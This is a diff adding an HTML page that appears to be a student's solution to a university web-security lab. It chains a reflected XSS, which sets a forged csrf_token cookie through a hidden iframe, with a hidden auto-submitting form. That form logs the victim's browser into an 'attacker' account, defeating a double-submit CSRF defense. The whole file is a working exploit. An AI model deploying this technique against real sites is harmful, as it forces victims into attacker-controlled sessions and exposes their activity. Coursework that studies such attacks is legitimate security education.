@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+		<iframe style="display:none;" id="cookie_setter" name="cookie_setter" src="http://cs526-online.cs.purdue.edu/project2b/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3Ewindow.onload%3Dfunction()%7Bdocument.cookie%3D%22csrf_token%3D12345678901234567890123456789012%22%7D%3C%2Fscript%3E" width="1000" height="400"></iframe>
+
+
+		<div style="display:none;">
+				<iframe id="invisible_danger" name="invisible_danger" width="1000" height="400"></iframe>
+
+				<form id="invisible_form" method="POST" action="http://cs526-online.cs.purdue.edu/project2b/login?csrfdefense=1&xssdefense=0" target="invisible_danger">
+					<input type="text" name="username" value="attacker" />
+					<input type="text" name="password" value="123456" />
+					<input type="hidden" name="csrf_token" value="12345678901234567890123456789012" />
+				</form>
+
+				<script>
+				
+				var the_first_iframe = document.getElementById("cookie_setter");
+				the_first_iframe.onload = function(){
+				document.getElementById("invisible_form").submit();
+				}
+				</script>
+		</div>
+
+	</head>
+</html>
